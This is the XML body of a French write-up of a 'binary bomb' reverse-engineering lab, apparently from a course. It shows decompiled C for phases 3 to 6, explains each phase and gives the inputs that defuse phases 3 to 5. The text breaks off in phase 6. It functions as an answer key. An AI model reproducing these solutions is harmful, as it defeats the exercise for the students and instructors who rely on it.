      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="12"/><text:span text:style-name="T23">n;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">unsigned</text:span> <text:span text:style-name="T19">int</text:span> <text:s text:c="3"/><text:span text:style-name="T23">i;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">char</text:span> <text:s text:c="11"/><text:span text:style-name="T23">c;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">char</text:span> <text:s text:c="11"/><text:span text:style-name="T23">check;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">unsigned</text:span> <text:span text:style-name="T19">int</text:span> <text:s text:c="3"/><text:span text:style-name="T23">j;</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">n</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">sscanf(input,</text:span> <text:span text:style-name="T36">"%d %c %d"</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T23">&amp;i,</text:span> <text:span text:style-name="T23">&amp;check,</text:span> <text:span text:style-name="T23">&amp;j);</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(n</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">3</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">switch</text:span><text:span text:style-name="T23">(i)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">case</text:span> <text:span text:style-name="T28">0</text:span>:</text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">c</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T36">'q'</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(j</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">777</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">break</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">case</text:span> <text:span text:style-name="T28">1</text:span>:</text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">c</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T36">'b'</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(j</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">214</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">break</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">case</text:span> <text:span text:style-name="T28">2</text:span>:</text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">c</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T36">'b'</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(j</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">755</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">break</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s/><text:span text:style-name="T23">[... SNIP ...]</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">case</text:span> <text:span text:style-name="T28">7</text:span>:</text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">c</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T36">'b'</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(j</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">524</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">break</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">default:</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">c</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T36">'x'</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(c</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T23">check)</text:span></text:p>
      <text:p text:style-name="P23"><text:soft-page-break/><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">Ici, il fallait simplement choisir le bon caractère (2nde position) et le bon chiffre (3ème position) en fonction du premier chiffre. Dans les indices, on nous indique le caractère 'b' ; on a donc ici 3 solutions potentielles qui collent avec l'indice :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">1 b 214</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">2 b 755</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">7 b 524</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">&gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">Phase 4 source</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T22">int</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16"> <text:s text:c="4"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T32">func4</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T26">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T22">int</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T26">k)</text:span></text:span></text:p>
      <text:p text:style-name="P22">{</text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">i;</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">j;</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(k</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">2</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="16"/><text:span text:style-name="T23">j</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T33">else</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="16"/><text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">func4(k</text:span> <text:span text:style-name="T23">-</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="16"/><text:span text:style-name="T23">j</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">func4(k</text:span> <text:span text:style-name="T23">-</text:span> <text:span text:style-name="T28">2</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="16"/><text:span text:style-name="T23">j</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">+</text:span> <text:span text:style-name="T23">j;</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">(j);</text:span></text:p>
      <text:p text:style-name="P22">}</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:span text:style-name="T19">void</text:span> <text:s text:c="3"/><text:span text:style-name="T29">phase_4</text:span><text:span text:style-name="T23">(</text:span><text:span text:style-name="T19">char</text:span> <text:span text:style-name="T23">*input)</text:span></text:p>
      <text:p text:style-name="P22">{</text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">n;</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">k;</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T23">n</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">sscanf(input,</text:span> <text:span text:style-name="T36">"%d"</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T23">&amp;k);</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(n</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">1</text:span> <text:span text:style-name="T23">||</text:span> <text:span text:style-name="T23">k</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T23">n</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">func4(k);</text:span> <text:s text:c="16"/><text:span text:style-name="T37">// func4 must return 55</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(n</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">55</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P24"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P16">}</text:p>
      <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T16"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On a une petite fonction récursive, et il faut qu'on fasse retourner </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">55 </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">à cette fonction. J'ai simplement reproduit la fonction dans un fichier C séparé, et essayé différentes valeurs de </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">k</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> jusqu'à trouver la bonne.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Réponse à la phase 4 : "</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">9</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T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gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">Phase 5 source</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T21">void</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> <text:s text:c="3"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">phase_5</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T21">char</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">*input)</text:span></text:span></text:p>
      <text:p text:style-name="P21">{</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">l;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">char</text:span> <text:s text:c="3"/><text:span text:style-name="T23">local_c[</text:span><text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">char</text:span> <text:s text:c="3"/><text:span text:style-name="T23">str[]</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T36">"isrveawhobpnutfg"</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">l</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">string_length(input);</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(l</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">l</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(l</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">local_c[l]</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">str[(input[l]</text:span> <text:span text:style-name="T23">&amp;</text:span> <text:span text:style-name="T28">0xf</text:span><text:span text:style-name="T23">)];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">l++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">l</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">strings_not_equal(local_c,</text:span> <text:span text:style-name="T36">"giants"</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(l</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On avait ici chaque caractère de notre input passé à l'opération bitwise AND 0xf, le résultat étant utilisé pour sélectionner un caractère de la chaîne </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">str</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, et il fallait au final reproduire le mot "giants". Pour la première lettre il nous fallait </text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">c &amp; 0xf = 15</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (g en 15ème position)<text:tab/><text:tab/>=&gt; 'o' correspond</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">c &amp; 0xf = 0</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (i en 0ème position)<text:tab/><text:tab/>=&gt; 'p' correspond</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">etc...</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Réponse à la phase 5 : "</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">opekmq</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T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gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">Phase 6 source</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T21">void</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> <text:s text:c="3"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">phase_6</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T21">char</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">*input)</text:span></text:span></text:p>
      <text:p text:style-name="P21">{</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">numbers[</text:span><text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">*ptrarray[</text:span><text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">j</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">*nd</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">&amp;node1;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">*int_ptr1;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T23">*int_ptr2;</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">read_six_numbers(input,</text:span> <text:span text:style-name="T23">numbers);</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(i</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">j</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">i;</text:span></text:p>
      <text:p text:style-name="P23"><text:soft-page-break/><text:s text:c="16"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(numbers[i]</text:span> <text:span text:style-name="T23">-</text:span> <text:span text:style-name="T28">1</text:span> <text:span text:style-name="T23">&gt;</text:span> <text:span text:style-name="T28">5</text:span><text:span text:style-name="T23">)</text:span> <text:s text:c="5"/><text:span text:style-name="T37">// Numbers between 1 and 6</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(j</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(numbers[i]</text:span> <text:span text:style-name="T23">==</text:span> <text:span text:style-name="T23">numbers[j])</text:span> </text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">j++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">i++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(i</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">j</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">int_ptr1</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">nd;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(numbers[i]</text:span> <text:span text:style-name="T23">&gt;</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(j</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T23">numbers[i])</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">int_ptr1</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T23">*)*(int_ptr1</text:span> <text:span text:style-name="T23">+</text:span> <text:span text:style-name="T28">8</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="32"/><text:span text:style-name="T23">j++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">ptrarray[i]</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">int_ptr1;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">i++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">int_ptr1</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">ptrarray[</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(i</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">6</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">int_ptr2</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">ptrarray[i];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">int_ptr1[</text:span><text:span text:style-name="T28">2</text:span><text:span text:style-name="T23">]</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">(</text:span><text:span text:style-name="T19">int</text:span><text:span text:style-name="T23">)int_ptr2;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">int_ptr2</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">int_ptr1;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">i++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"/>
